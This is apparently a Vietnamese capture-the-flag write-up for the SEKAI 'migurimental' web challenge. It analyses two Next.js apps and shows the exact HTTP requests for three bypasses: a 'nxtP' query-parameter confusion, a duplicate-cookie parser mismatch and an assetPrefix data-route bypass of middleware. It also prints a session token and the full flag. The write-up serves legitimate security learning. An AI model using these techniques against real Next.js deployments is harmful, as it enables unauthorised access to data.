# web/migurimental

## Phân tích source

Hệ thống gồm hai app Next.js (`backstage1`, `backstage2`) đứng sau reverse proxy nginx. `config/nginx.conf` chèn sẵn vài header nội bộ trước khi chuyển tiếp request, trong đó có `X-Real-Migu`:

```nginx
proxy_set_header X-Real-Migu $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Host $host;
proxy_set_header X-Forwarded-Proto $scheme;
```

Vì header này do nginx set nên client không tự đặt được từ bên ngoài.

`backstage1` có middleware xác thực session JWT rồi áp thêm điều kiện cho hai route (`apps/backstage1/middleware.js`):

```js
if (request.nextUrl.pathname === '/access-card') {
  const checkedId = request.nextUrl.searchParams.get('id')
  if (checkedId !== session.sub) return deny(request)
}

if (request.nextUrl.pathname === '/backroom') {
  const expectedTicket = session.ticketUuid
  const middlewareTicket = request.cookies.get('ticket_uuid')?.value || ''
  if (!expectedTicket || middlewareTicket !== expectedTicket) return deny(request)
}
```

- `/access-card`: chỉ cho qua khi tham số `id` trên URL bằng `session.sub` (id của user trong JWT).
- `/backroom`: chỉ cho qua khi cookie `ticket_uuid` bằng `session.ticketUuid`.

Trang `/access-card` đọc `query.id`, tra user tương ứng và render QR code mã hoá `ticketUuid` của user đó (`apps/backstage1/pages/access-card.js`):

```js
export async function getServerSideProps({ query }) {
  const user = await findById(query.id)
  if (!user) return { notFound: true }
  const qrDataUrl = await QRCode.toDataURL(user.ticketUuid, ...)
  return { props: { user: { id: user.id, username: user.username, tier: user.tier }, qrDataUrl } }
}
```

Trang `/backroom` tra user theo cookie `ticket_uuid`; nếu user đó có `id === 1` thì trả `backstageNote` từ `readFirstFlagHalf()`, ngược lại trả 403 (`apps/backstage1/pages/backroom.js`):

```js
const ticketUser = await findByTicketUuid(req.cookies.ticket_uuid || '')
if (ticketUser?.id !== 1) {
  res.statusCode = 403
  return { props: { backstageNote: '', denied: true } }
}
return { props: { backstageNote: await readFirstFlagHalf(), denied: false } }
```

`backstage2` có middleware chỉ cho truy cập `/` khi header `x-real-migu` đúng giá trị nội bộ, còn lại redirect sang `/rejected` (`apps/backstage2/middleware.js`):

```js
if (request.nextUrl.pathname === '/') {
  const realMigu = request.headers.get('x-real-migu') || ''
  if (realMigu !== '1.3.3.7') {
    return NextResponse.redirect(new URL('/rejected', request.url))
  }
}
```

Middleware này khai báo `matcher: ['/']`, trong khi `next.config.js` lại đặt `assetPrefix: '/cdn'`:

```js
export const config = { matcher: ['/'] }
```
```js
module.exports = { assetPrefix: '/cdn' }
```

## Khai thác

### Bypass /access-card bằng nxtP

![alt text](image.png)

Sau khi đăng ký/login ta có `session.sub` (id của mình), `session.ticketUuid` và cookie `ticket_uuid` của mình.

![alt text](image-1.png)

![alt text](image-2.png)

Middleware check `/access-card` bằng `searchParams.get('id') === session.sub`, còn Pages router đọc `query.id` ở `getServerSideProps`.

Gửi request:

```http
GET /access-card?id=1&nxtPid=198
```

Trong middleware, Next.js normalize key có prefix `nxtP`, nên `nxtPid` được hiểu thành `id`. Middleware thấy `id=<id_cua_minh>` và cho qua. Còn `getServerSideProps` vẫn lấy `query.id` raw ban đầu là `1`, nên page render access card của user `miku`:

```text
id: 1
username: miku
tier: VIP
```

![alt text](image-3.png)

### Lấy ticket của Miku

Trong HTML trả về có QR dưới dạng data URL (`data:image/png;base64,...`).

Decode ra file PNG rồi đọc QR.

![alt text](image-4.png)

Ticket UUID của `miku`:

```text
92ca07cc-13bd-4d2b-b6b3-e8399790078a
```

### Duplicate cookie parser mismatch ở /backroom

Gửi header cookie có hai `ticket_uuid`:

```http
Cookie: ticket_uuid=92ca07cc-13bd-4d2b-b6b3-e8399790078a; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5ndXllbnZhbmEiLCJ0aWVyIjoiUkVHVUxBUiIsInRpY2tldFV1aWQiOiJmNmQ4NjZmOS01NmNkLTQ3N2MtYjI4Yy1iN2JiN2FiYTFhYzUiLCJzdWIiOiIxOTgiLCJpYXQiOjE3ODMwNDE4Njd9.2ufRxsvqyGuL4vtI4HboMboERWl8Tnsz1HrCU7aZi_Q; ticket_uuid=f6d866f9-56cd-477c-b28c-b7bb7aba1ac5
```

Middleware thấy:
- `ticket_uuid` cuối là ticket của mình, khớp `session.ticketUuid` nên cho đi tiếp.
- `getServerSideProps` thấy `ticket_uuid` đầu là ticket của `miku` nên `findByTicketUuid()` trả về user id `1`; page `/backroom` trả nửa flag.

```http
GET /backroom HTTP/1.1
Host: migurimental.chals.sekai.team
Cookie: ticket_uuid=92ca07cc-13bd-4d2b-b6b3-e8399790078a; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5ndXllbnZhbmEiLCJ0aWVyIjoiUkVHVUxBUiIsInRpY2tldFV1aWQiOiJmNmQ4NjZmOS01NmNkLTQ3N2MtYjI4Yy1iN2JiN2FiYTFhYzUiLCJzdWIiOiIxOTgiLCJpYXQiOjE3ODMwNDE4Njd9.2ufRxsvqyGuL4vtI4HboMboERWl8Tnsz1HrCU7aZi_Q; ticket_uuid=f6d866f9-56cd-477c-b28c-b7bb7aba1ac5
```

![alt text](image-5.png)

Nửa flag:

```text
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_
```
### Bypass middleware app 2 bằng `/cdn/_next/data`

Truy cập thẳng `/` trên app 2 sẽ bị middleware redirect sang `/rejected` (vì thiếu header nội bộ `x-real-migu`).

Nhưng middleware chỉ khai báo `matcher: ['/']`, trong khi `next.config.js` đặt `assetPrefix: '/cdn'`, nên data route của trang index còn phục vụ được qua prefix `/cdn`.

Mở `/rejected` và tìm `buildId`:

![alt text](image-6.png)


```text
"buildId":"VlOPiWVknxOpNtTjt6ctd"
```

Rồi gọi data route của trang index qua prefix `/cdn`:

```http
GET /cdn/_next/data/VlOPiWVknxOpNtTjt6ctd/index.json HTTP/1.1
Host: migurimental-2.chals.sekai.team
```

![alt text](image-7.png)

Nửa flag còn lại:

```text
c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```

## Flag

```
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```
